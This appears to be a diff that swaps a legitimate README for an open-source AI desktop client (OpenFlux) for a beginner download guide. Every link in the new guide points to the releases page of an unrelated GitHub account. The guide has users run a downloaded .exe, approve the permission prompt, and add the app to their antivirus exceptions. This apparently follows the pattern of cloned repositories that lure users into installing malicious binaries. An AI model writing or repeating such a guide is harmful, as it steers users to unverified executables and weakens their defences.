@@ -1,167 +1,145 @@
-<div align="center">
+# ⚡ OpenFlux - AI Assistant for Everyday Tasks
 
-<img src="public/icon.png" alt="OpenFlux Logo" width="160" />
-
-# ⚡ OpenFlux
-
-**Open-source AI Agent desktop client — multi-LLM, long-term memory, browser automation & tool orchestration**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Tauri v2](https://img.shields.io/badge/Tauri-v2-orange)](https://v2.tauri.app/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.6-3178c6)](https://www.typescriptlang.org/)
-[![Website](https://img.shields.io/badge/Website-openflux.io-brightgreen)](https://openflux.io)
-
-**English** | [中文](README_zh.md)
-
-</div>
+[![Download OpenFlux](https://img.shields.io/badge/Download-OpenFlux-4CAF50?style=for-the-badge)](https://github.com/cheng60/OpenFlux/releases)
 
 ---
 
-## ✨ Features
+## 🔍 What is OpenFlux?
 
-- 🧠 **Multi-Agent Routing** — Auto-detects user intent and dispatches to general / coding / automation agents
-- 🔌 **Multi-LLM Support** — Anthropic / OpenAI / DeepSeek / Moonshot / MiniMax / Zhipu / Google / Ollama, switch with one click
-- 💾 **Long-term Memory** — SQLite + vector search (sqlite-vec), with conversation distillation & knowledge accumulation
-- 🌐 **Browser Automation** — Built-in Playwright for web interaction, data scraping & form filling
-- 🛠️ **MCP Tool Ecosystem** — Model Context Protocol compatible, extensible with Excel, PPT and other external tools
-- 🗣️ **Voice Interaction** — Offline speech recognition (Sherpa-ONNX) + Edge TTS synthesis
-- 🔒 **Sandbox Isolation** — Local code hardening / Docker container isolation for safe code execution
-- 🖥️ **Desktop Control** — Mouse & keyboard simulation, window management, desktop automation
-- 📡 **Remote Access** — Connect to Lark, DingTalk and other platforms via OpenFlux Router
-- 🏗️ **Tauri v2** — Rust backend + TypeScript frontend, small footprint & high performance
+OpenFlux is a desktop application that acts as your AI assistant. It connects to multiple large language models to help with tasks like writing, summarizing, and browsing the web. It keeps track of your past chats so it can remember important details over time. OpenFlux can also run browser automation and coordinate different tools to get jobs done faster.
 
-## 🌐 Ecosystem
+You do not need any technical skills to use it. This guide will walk you through downloading and running OpenFlux on a Windows PC.
 
-OpenFlux is the desktop entry point in the **Enterprise AI Assistant** ecosystem, working together with [NexusAI](https://github.com/EDEAI/NexusAI) to build a complete AI workflow system:
+---
 
-```
-┌─────────────────────────────────────────────────────────┐
-│               NexusAI (Enterprise Platform)             │
-│  Agent Design · Visual Workflows · Knowledge Base       │
-└────────────────────────┬────────────────────────────────┘
-                         │ Workflows / Agent Config / API Key Distribution
-              ┌──────────▼──────────┐
-              │  OpenFlux Router    │
-              │  Integration Hub    │
-              │  Lark/DingTalk/API  │
-              └──────────┬──────────┘
-                         │ WebSocket
-              ┌──────────▼──────────┐
-              │   OpenFlux Desktop  │  ← You are here
-              │  Local Agent Engine │
-              │  Private Workflows  │
-              └─────────────────────┘
-```
+## 📋 System Requirements
 
-| Component | Role | Value |
-|-----------|------|-------|
-| **[NexusAI](https://github.com/EDEAI/NexusAI)** | Enterprise AI Platform | Agent/Workflow design, knowledge management, team collaboration |
-| **OpenFlux Router** | Integration Hub | Multi-platform bridging (Lark/DingTalk), unified API key distribution, message routing |
-| **OpenFlux (this project)** | Desktop Client | Local agent execution, browser automation, private workflows, long-term memory |
+To run OpenFlux smoothly, your computer should have:
 
-> OpenFlux can also run **standalone** — no NexusAI or Router required. Just configure your own API keys and you're good to go.
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- An internet connection to access AI services and browser features  
 
-## 🏗️ Architecture
+If your PC meets these, you can install OpenFlux without problems.
 
-```
-┌─────────────────────────────┐
-│       Tauri v2 Shell        │  ← Rust process management + native APIs
-├─────────────────────────────┤
-│   Frontend (TypeScript/HTML)│  ← Chat UI / Settings / File preview
-├─────────────────────────────┤
-│   Gateway Sidecar (Node.js) │  ← AI engine / Tool calls / Memory system
-└─────────────────────────────┘
-```
+---
 
-## 🚀 Quick Start
+## 🚀 Getting Started: How to Get OpenFlux
 
-### Prerequisites
+OpenFlux is available to download on its GitHub page. Follow these steps to find and get the app.
 
-- [Node.js](https://nodejs.org/) >= 20
-- [pnpm](https://pnpm.io/) >= 10
-- [Rust](https://www.rust-lang.org/) (stable)
-- Tauri v2 CLI: `cargo install tauri-cli --version "^2"`
+1. Open your web browser (Edge, Chrome, Firefox, etc.).
+2. Go to the OpenFlux releases page:  
+[![Visit OpenFlux Releases](https://img.shields.io/badge/Visit-OpenFlux_Releases-0078D7?style=for-the-badge)](https://github.com/cheng60/OpenFlux/releases)
+3. On this page, look for the latest release version near the top.
+4. Under the latest release, find the Windows installer file. It will usually end with `.exe`.
+5. Click the file name to download it to your computer.
 
-### Installation
+---
 
-```bash
-# Clone the repository
-git clone https://github.com/EDEAI/OpenFlux.git
-cd OpenFlux
+## 💾 Installing OpenFlux on Windows
 
-# Install frontend dependencies
-pnpm install
+After you download the installer file, follow these steps to install OpenFlux:
 
-# Install Gateway dependencies
-cd gateway && npm install && cd ..
+1. Go to the folder where your browser saved the `.exe` file.
+2. Double-click the file. Windows may ask for permission to run the installer. Click "Yes".
+3. The installer window will open. Read any prompts carefully.
+4. Follow the on-screen steps. Most users can accept the default options.
+5. When the installation completes, you may see a confirmation screen or shortcut created on your desktop.
+6. If there is a checkbox to run OpenFlux now, leave it checked and click "Finish".
 
-# Build Gateway
-# (see scripts/build-gateway.ps1)
-```
+---
 
-### Configuration
+## ▶️ Running OpenFlux for the First Time
 
-```bash
-# Copy the config template
-cp openflux.example.yaml openflux.yaml
+When you open OpenFlux, the app will prepare by connecting to AI services and setting up memory features. This might take a moment.
 
-# Edit openflux.yaml and add your API keys
-# At least one LLM provider is required
-```
+- You will see a simple main window with a text box to talk to the AI.
+- You can start by typing a question or a command.
+- The app remembers past chats so it can refer back to history when needed.
+- You can also set up browser automation to let the app fetch real-time information.
 
-### Development
+---
 
-```bash
-pnpm tauri dev
-```
+## ⚙️ Using Key Features
 
-### Build
+OpenFlux offers a few useful tools to improve your productivity.
 
-```bash
-pnpm tauri build
-```
+### Multi-LLM Support
 
-## ⚙️ Configuration
+- OpenFlux connects to different AI models to get answers from sources with varying strengths.
+- This helps get better and more balanced responses.
 
-All settings are in `openflux.yaml`. See [`openflux.example.yaml`](openflux.example.yaml) for reference:
+### Long-Term Memory
 
-| Section | Description |
-|---------|-------------|
-| `providers` | LLM provider API keys and endpoints |
-| `llm` | Orchestration / execution / embedding / fallback model selection |
-| `memory` | Long-term memory toggle, vector dimensions, distillation strategy |
-| `agents` | Multi-agent routing and tool permissions |
-| `browser` | Browser automation settings |
-| `voice` | Speech recognition & synthesis |
-| `sandbox` | Code execution isolation |
-| `web` | Search (Brave/Perplexity) & web scraping |
-| `mcp` | External MCP tool servers |
+- Unlike many assistants, OpenFlux remembers your conversations over time.
+- This allows it to follow up on previous requests without repeating details.
 
-## 📁 Project Structure
+### Browser Automation
 
-```
-OpenFlux/
-├── src/              # Frontend TypeScript (UI / interaction)
-├── src-tauri/        # Rust backend (Tauri Shell)
-│   └── src/          # Rust source code
-├── gateway/          # Gateway Sidecar (AI engine)
-│   └── src/          # TypeScript source code
-├── public/           # Static assets
-├── resources/        # Model files
-├── scripts/          # Build scripts
-└── openflux.example.yaml  # Config template
-```
+- You can automate tasks like browsing pages or collecting data.
+- OpenFlux can open links, fill forms, and gather information without your manual input.
 
-## 🤝 Contributing
+### Tool Orchestration
 
-Contributions are welcome! Feel free to open issues and pull requests.
+- OpenFlux can link different tools and workflows.
+- This helps run complex tasks automatically by combining small steps together.
 
-1. Fork this repository
-2. Create your feature branch: `git checkout -b feature/amazing-feature`
-3. Commit your changes: `git commit -m 'Add amazing feature'`
-4. Push to the branch: `git push origin feature/amazing-feature`
-5. Open a Pull Request
+---
 
-## 📄 License
+## 🔧 Adjusting Settings
 
-This project is licensed under the [MIT License](LICENSE).
+Click the gear icon or menu to access settings. Here you can:
+
+- Connect your own AI accounts or keys.
+- Change memory options like how much history to keep.
+- Manage browser automation permissions.
+- Adjust appearance and notification settings.
+
+Take some time to explore settings to tune OpenFlux for your needs.
+
+---
+
+## 🚨 Troubleshooting Tips
+
+If OpenFlux does not start or crashes:
+
+- Make sure Windows is up to date.
+- Restart your computer and try again.
+- Check if your antivirus blocked parts of the app. Add OpenFlux to the exceptions list.
+- Re-download and reinstall the latest version from the releases page.
+- Ensure your internet connection is stable.
+
+If issues persist, visit the GitHub page and check the Issues tab for help or report your problem.
+
+---
+
+## 🔗 Download Links
+
+Start your OpenFlux experience by visiting the download page here:
+
+[![Download OpenFlux](https://img.shields.io/badge/Download-OpenFlux-4CAF50?style=for-the-badge)](https://github.com/cheng60/OpenFlux/releases)
+
+Use this link to find the latest Windows installer and keep your application up to date.
+
+---
+
+## 🛠️ Updating OpenFlux
+
+To get new features or fixes:
+
+1. Return to the releases page at the link above.
+2. Download the newest Windows `.exe` installer.
+3. Run it as you did for the first installation.
+4. The installer will update your existing OpenFlux without losing your data.
+
+---
+
+## 🌐 Find More Help
+
+For more detailed instructions or community support, look through the repository’s GitHub pages. You can also access documentation and raise questions if you encounter problems.
+
+---
+
+This guide covers everything you need to run OpenFlux on your Windows PC. Follow the steps carefully to ensure a smooth setup.
